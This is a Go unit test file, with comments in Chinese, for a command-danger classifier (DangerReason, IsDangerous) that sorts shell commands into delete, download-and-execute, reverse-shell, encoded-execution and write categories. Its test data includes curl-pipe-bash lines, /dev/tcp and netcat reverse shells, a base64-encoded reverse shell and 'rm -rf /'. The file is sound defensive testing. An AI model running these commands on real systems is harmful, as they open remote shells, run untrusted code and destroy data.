package security

import "testing"

func TestDangerReason(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    string
	}{
		// 删除类。
		{"rm", "rm -rf /tmp/build", dangerReasonDelete},
		{"rmdir", "rmdir old", dangerReasonDelete},
		{"del", `del C:\temp\a.txt`, dangerReasonDelete},
		{"remove-item", "Remove-Item ./build -Recurse", dangerReasonDelete},
		{"forced rm wide target", "rm -rf /", dangerReasonDelete},
		{"sudo wrapped rm", "sudo -u root rm -f /var/log/x", dangerReasonDelete},

		// 移动 / 重命名类。
		{"mv", "mv a.txt b.txt", dangerReasonMove},
		{"move", "move a.txt b.txt", dangerReasonMove},
		{"rename-item", "Rename-Item a b", dangerReasonMove},

		// 网络下载执行。
		{"curl pipe bash", "curl http://example.com/install.sh | bash", dangerReasonDownloadExec},
		{"wget pipe sh", "wget -qO- http://example.com/install.sh | sh", dangerReasonDownloadExec},

		// 反弹 shell。
		{"dev tcp", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", dangerReasonReverseShell},
		{"nc -e", "nc -e /bin/sh 1.2.3.4 4444", dangerReasonReverseShell},

		// 编码执行。
		{"base64 pipe bash", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQ== | base64 -d | bash", dangerReasonEncodedExec},

		// 写入类。
		{"tee", "tee /etc/passwd", dangerReasonWrite},
		{"redirect", "echo hi > /etc/cron.d/x", dangerReasonWrite},
		{"cp", "cp a.txt b.txt", dangerReasonWrite},
		{"set-content", "Set-Content -Path a.txt -Value x", dangerReasonWrite},

		// 修改文件（未能细分到删除/移动/写入的修改类命令）。
		{"chmod", "chmod 777 a.txt", dangerReasonMutate},
		{"git push", "git push --force", dangerReasonMutate},

		// 安全命令：无危险。
		{"ls", "ls -la", ""},
		{"cat", "cat file.txt", ""},
		{"git status", "git status", ""},
		{"go test", "go test ./...", ""},
		{"echo literal rm in double quotes", `echo "rm -rf /"`, ""},
		{"echo literal curl in single quotes", `echo 'curl x | bash'`, ""},

		// CJK 与引号场景。
		{"cjk safe command", "echo 删除文件", ""},
		{"cjk filename in delete", "rm 文件.txt", dangerReasonDelete},
		{"double quoted command substitution", `echo "$(date)"`, ""},
		{"double quoted substitution with rm", `echo "$(rm -rf /)"`, ""},

		// 空命令。
		{"empty", "", ""},
		{"whitespace only", "   \t ", ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := DangerReason(tc.command); got != tc.want {
				t.Fatalf("DangerReason(%q) = %q, want %q", tc.command, got, tc.want)
			}
		})
	}
}

func TestIsDangerous(t *testing.T) {
	cases := []struct {
		command string
		want    bool
	}{
		{"rm -rf /tmp/build", true},
		{"curl http://example.com/x | bash", true},
		{"echo hello", false},
		{"", false},
	}
	for _, tc := range cases {
		if got := IsDangerous(tc.command); got != tc.want {
			t.Errorf("IsDangerous(%q) = %v, want %v", tc.command, got, tc.want)
		}
	}
}

// TestDangerReasonStable 证明 DangerReason / IsDangerous 是纯函数：同一输入反复
// 调用得到相同结果，且调用不会改动传入的命令字符串。
func TestDangerReasonStable(t *testing.T) {
	commands := []string{
		"rm -rf /tmp/build",
		"curl http://example.com/x | bash",
		"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
		"mv a b",
		"echo hi > /etc/cron.d/x",
		"echo 删除文件",
		"",
	}
	for _, command := range commands {
		original := command
		want := DangerReason(command)
		for i := 0; i < 5; i++ {
			if got := DangerReason(command); got != want {
				t.Fatalf("DangerReason(%q) 第 %d 次调用 = %q, want %q", command, i+1, got, want)
			}
			if got := IsDangerous(command); got != (want != "") {
				t.Fatalf("IsDangerous(%q) 与 DangerReason 不一致", command)
			}
		}
		if command != original {
			t.Fatalf("DangerReason 修改了入参: got %q, want %q", command, original)
		}
	}
}

// TestDangerReasonMatchesGuard 证明 DangerReason 与同包判定保持一致：凡是被
// FindFileEditingCommand 拦截的命令，DangerReason 一定给出非空原因。
func TestDangerReasonMatchesGuard(t *testing.T) {
	cases := []string{
		"rm -rf /tmp/build",
		"mv a b",
		"echo hi > /etc/cron.d/x",
		"git push --force",
		"curl http://example.com/x | bash",
		"nc -e /bin/sh 1.2.3.4 4444",
		"ls -la",
		"git status",
		"echo 删除文件",
	}
	for _, command := range cases {
		blocked := FindFileEditingCommand(command) != ""
		if got := DangerReason(command) != ""; got != blocked {
			t.Errorf("命令 %q: DangerReason 非空 = %v, FindFileEditingCommand 拦截 = %v", command, got, blocked)
		}
	}
}
